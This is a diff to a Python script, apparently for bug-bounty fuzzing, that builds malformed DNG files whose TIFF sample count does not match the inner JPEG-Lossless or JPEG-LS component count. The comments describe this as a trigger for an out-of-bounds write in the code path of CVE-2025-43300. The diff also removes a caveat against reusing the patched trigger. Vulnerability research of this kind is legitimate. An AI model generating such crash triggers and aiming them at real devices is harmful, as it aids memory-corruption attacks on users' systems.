@@ -322,47 +322,67 @@ def build_jpegls(width, height, nf, bits=8):
     return bytes(s)
 
 
-# ========================== JPEG-Lossless reference ==========================
+# ========================== JPEG-Lossless (SOF3) builder ==========================
 
-def build_jpegl_reference(width, height, nf, bits=16):
+def build_jpegl(width, height, nf, bits=16):
     """
-    REFERENCE ONLY -- structure of the patched CVE-2025-43300 trigger.
-    Use to verify Apple's patch was applied (should NOT crash on patched iOS).
-    Do NOT submit this as a new bounty finding.
+    Valid JPEG-Lossless (SOF3) stream for an all-zero image.
+    nf: component count in SOF3 = INNER metadata (mismatch target).
+    Outer TIFF SamplesPerPixel != nf is what triggers the OOB bug class.
+
+    Encoding details for an all-zero image:
+      - Predictor 1 (Ra): first pixel uses Ra=0 (border); subsequent use left neighbor
+      - All pixels = 0, so every prediction error = 0
+      - Huffman table: 1 code of length 1 bit ('0') for symbol 0 (category 0 = zero error)
+      - Scan data: width*height*nf zero bits, packed into (n_bits+7)//8 zero bytes
+      - No 0xFF bytes in scan data so no byte-stuffing needed
     """
+    nf = max(nf, 1)
     s = bytearray()
     s += b'\xFF\xD8'  # SOI
 
-    nf = max(nf, 1)
+    # SOF3 (lossless sequential)
     lsof = 8 + 3 * nf
-    s += b'\xFF\xC3'  # SOF3
+    s += b'\xFF\xC3'
     s += struct.pack('>H', lsof)
-    s += struct.pack('>B', bits & 0xFF)
-    s += struct.pack('>H', height)
-    s += struct.pack('>H', width)
-    s += struct.pack('>B', nf)   # Nf <-- mismatch target
+    s += struct.pack('>B', bits)    # P: sample precision
+    s += struct.pack('>H', height)  # Y
+    s += struct.pack('>H', width)   # X
+    s += struct.pack('>B', nf)      # Nf  <-- INNER METADATA (mismatch target)
     for i in range(nf):
-        s += struct.pack('>B', i + 1)
-        s += b'\x11'
-        s += b'\x00'
+        s += struct.pack('>B', i + 1)  # Ci: component identifier
+        s += b'\x11'                   # Hi:Vi = 1:1
+        s += b'\x00'                   # Tqi
 
-    for i in range(nf):
-        dht_inner = struct.pack('>B', i) + b'\x00' * 16
-        s += b'\xFF\xC4'
-        s += struct.pack('>H', len(dht_inner) + 2)
-        s += dht_inner
+    # DHT: one shared Huffman table (Tc=0 DC, Th=0).
+    # BITS[1..16] = [1, 0, 0, ..., 0]  — exactly 1 code of length 1 bit.
+    # HUFFVAL     = [0]                 — that code represents category 0 (zero error).
+    # Code assignment: category 0 → '0' (single 0 bit).
+    dht_payload = b'\x00'            # Tc=0, Th=0
+    dht_payload += b'\x01' + b'\x00' * 15  # BITS[1..16]
+    dht_payload += b'\x00'           # HUFFVAL[0] = 0
+    s += b'\xFF\xC4'
+    s += struct.pack('>H', 2 + len(dht_payload))
+    s += dht_payload
 
+    # SOS: interleaved scan of all nf components, all using Huffman table 0
     lsos = 6 + 2 * nf
     s += b'\xFF\xDA'
     s += struct.pack('>H', lsos)
     s += struct.pack('>B', nf)
     for i in range(nf):
-        s += struct.pack('>B', i + 1)
-        s += struct.pack('>B', i)
-    s += b'\x01\x00\x00'   # Ss=1 predictor, Se, Ah/Al
+        s += struct.pack('>B', i + 1)  # Csj: component selector
+        s += b'\x00'                   # Tdj: Huffman table 0
+    s += b'\x01'   # Ss = 1 (predictor Ra)
+    s += b'\x00'   # Se = 0
+    s += b'\x00'   # Ah=0, Al=0
 
-    s += b'\x00' * max(width * nf, 32)
-    s += b'\xFF\xD9'
+    # Scan data: each of width*height*nf pixels encodes as 1 zero bit.
+    # Total: (w*h*nf+7)//8 zero bytes — no 0xFF bytes, no stuffing needed.
+    n_bits = width * height * nf
+    s += bytes((n_bits + 7) // 8)
+
+    s += b'\xFF\xD9'  # EOI
     return bytes(s)
 
 
@@ -432,8 +452,8 @@ def build_dng(width=64, height=64, spp=3, inner_comps=1,
         payload = build_jpegls(width, height, nf=inner_comps, bits=min(bits, 8))
         label = f'JPEG-LS nf={inner_comps}'
     elif codec == COMP_JPEG_LOSSLESS:
-        payload = build_jpegl_reference(width, height, nf=inner_comps, bits=bits)
-        label = f'JPEG-L nf={inner_comps} [PATCHED CVE-2025-43300 ref]'
+        payload = build_jpegl(width, height, nf=inner_comps, bits=bits)
+        label = f'JPEG-L nf={inner_comps}'
     else:
         raise ValueError(f'Unknown codec: {codec}')
 
@@ -470,30 +490,34 @@ def build_dng(width=64, height=64, spp=3, inner_comps=1,
 
 CORPUS = [
     # (width, height, spp, inner_comps, bits, codec, name)
-    # ---- CONTROL cases: spp == inner_comps (matched, should decode without error) ----
-    # If these return rc=13, the stub bitstream itself is invalid.
-    # If these return rc=0 and mismatch cases return rc=13, codec IS reaching OOB point.
-    (64,   64,   1, 1, 16, COMP_JPEG2000, 'CTRL_j2k_1spp_1csiz_16b'),
-    (64,   64,   3, 3, 16, COMP_JPEG2000, 'CTRL_j2k_3spp_3csiz_16b'),
-    (64,   64,   1, 1,  8, COMP_JPEG_LS,  'CTRL_jpegls_1spp_1nf_8b'),
-    (64,   64,   3, 3,  8, COMP_JPEG_LS,  'CTRL_jpegls_3spp_3nf_8b'),
-    # ---- J2K primary mismatch targets ----
-    (64,   64,   3, 1,  8, COMP_JPEG2000, 'j2k_3spp_1csiz_8b'),
-    (64,   64,   3, 1, 16, COMP_JPEG2000, 'j2k_3spp_1csiz_16b'),
-    (64,   64,   4, 1, 16, COMP_JPEG2000, 'j2k_4spp_1csiz_16b'),
-    (256, 256,   3, 1, 16, COMP_JPEG2000, 'j2k_3spp_1csiz_16b_256'),
-    (512, 512,   3, 1, 16, COMP_JPEG2000, 'j2k_3spp_1csiz_16b_512'),
-    (64,   64,   4, 2, 16, COMP_JPEG2000, 'j2k_4spp_2csiz_16b'),
-    (64,   64,   6, 1, 16, COMP_JPEG2000, 'j2k_6spp_1csiz_16b'),
-    (64,   64,   3, 0,  8, COMP_JPEG2000, 'j2k_3spp_0csiz_edge'),
-    (4096, 4096, 3, 1, 16, COMP_JPEG2000, 'j2k_3spp_1csiz_16b_4k'),
-    # ---- JPEG-LS mismatch targets ----
-    (64,   64,   3, 1,  8, COMP_JPEG_LS,  'jpegls_3spp_1nf_8b'),
-    (64,   64,   4, 1,  8, COMP_JPEG_LS,  'jpegls_4spp_1nf_8b'),
-    (256, 256,   3, 1,  8, COMP_JPEG_LS,  'jpegls_3spp_1nf_8b_256'),
-    (64,   64,   3, 2,  8, COMP_JPEG_LS,  'jpegls_3spp_2nf_8b'),
-    # ---- Patched reference ----
-    (64,   64,   2, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_2spp_1nf_PATCHED_ref'),
+    #
+    # ---- JPEG-Lossless (SOF3, compression=7) ----
+    # Same code path as CVE-2025-43300. Valid bitstream, mismatch in Nf vs SPP.
+    # CTRL: spp == nf (matched) — should decode clean (rc=0). Baseline check.
+    (64,  64,  1, 1, 16, COMP_JPEG_LOSSLESS, 'CTRL_jpegl_1spp_1nf_16b'),
+    (64,  64,  3, 3, 16, COMP_JPEG_LOSSLESS, 'CTRL_jpegl_3spp_3nf_16b'),
+    # Mismatch targets: nf < spp → allocate for nf, loop over spp → OOB write
+    (64,  64,  2, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_2spp_1nf_16b'),
+    (64,  64,  3, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_3spp_1nf_16b'),
+    (64,  64,  4, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_4spp_1nf_16b'),
+    (256, 256, 3, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_3spp_1nf_16b_256'),
+    (512, 512, 3, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_3spp_1nf_16b_512'),
+    (64,  64,  4, 2, 16, COMP_JPEG_LOSSLESS, 'jpegl_4spp_2nf_16b'),
+    (64,  64,  6, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_6spp_1nf_16b'),
+    #
+    # ---- JPEG-LS (compression=34892) ----
+    # CTRL: matched
+    (64,  64,  1, 1,  8, COMP_JPEG_LS, 'CTRL_jpegls_1spp_1nf_8b'),
+    (64,  64,  3, 3,  8, COMP_JPEG_LS, 'CTRL_jpegls_3spp_3nf_8b'),
+    # Mismatch targets
+    (64,  64,  3, 1,  8, COMP_JPEG_LS, 'jpegls_3spp_1nf_8b'),
+    (64,  64,  4, 1,  8, COMP_JPEG_LS, 'jpegls_4spp_1nf_8b'),
+    (256, 256, 3, 1,  8, COMP_JPEG_LS, 'jpegls_3spp_1nf_8b_256'),
+    #
+    # ---- J2K (compression=34712) — retained, likely unsupported by sips ----
+    (64,  64,  1, 1, 16, COMP_JPEG2000, 'CTRL_j2k_1spp_1csiz_16b'),
+    (64,  64,  3, 1, 16, COMP_JPEG2000, 'j2k_3spp_1csiz_16b'),
+    (64,  64,  4, 1, 16, COMP_JPEG2000, 'j2k_4spp_1csiz_16b'),
 ]
 
 
@@ -583,8 +607,7 @@ def main():
                     help='Test corpus via sips (macOS only)')
     args = ap.parse_args()
 
-    codec_map = {'j2k': COMP_JPEG2000, 'jpegls': COMP_JPEG_LS,
-                 'jpegl': COMP_JPEG_LOSSLESS}
+    codec_map = {'j2k': COMP_JPEG2000, 'jpegls': COMP_JPEG_LS, 'jpegl': COMP_JPEG_LOSSLESS}
 
     if args.corpus:
         generate_corpus()
